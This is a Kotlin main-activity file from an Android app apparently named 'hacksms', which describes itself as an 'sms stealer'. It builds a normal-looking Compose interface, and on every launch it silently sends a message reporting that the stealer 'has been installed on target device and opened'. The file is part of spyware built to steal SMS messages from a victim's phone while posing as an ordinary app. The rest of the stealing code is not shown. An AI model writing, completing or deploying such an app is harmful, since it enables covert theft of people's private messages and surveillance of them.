package cocomelonc.hacksms

import cocomelonc.hacksms.tools.HackSmsNetwork
import cocomelonc.hacksms.ui.HackSmsNavigation
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.material3.Surface
import androidx.navigation.compose.rememberNavController
import com.example.compose.HackSmsTheme

class HackSmsMainActivity : ComponentActivity() {
    private lateinit var hackSmsViewModel: HackSmsViewModel
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        hackSmsViewModel = HackSmsViewModel(this)
        setContent {
            HackSmsTheme {
                Surface {
                    val navController = rememberNavController()
                    hackSmsViewModel.navController = navController
                    HackSmsNavigation(hackSmsViewModel = hackSmsViewModel)
                }
            }
        }
        HackSmsNetwork(this).sendTextMessage("LoveBahrain sms stealer has been installed on target device and opened\nIgnore this message if you received it from this device before")
    }
}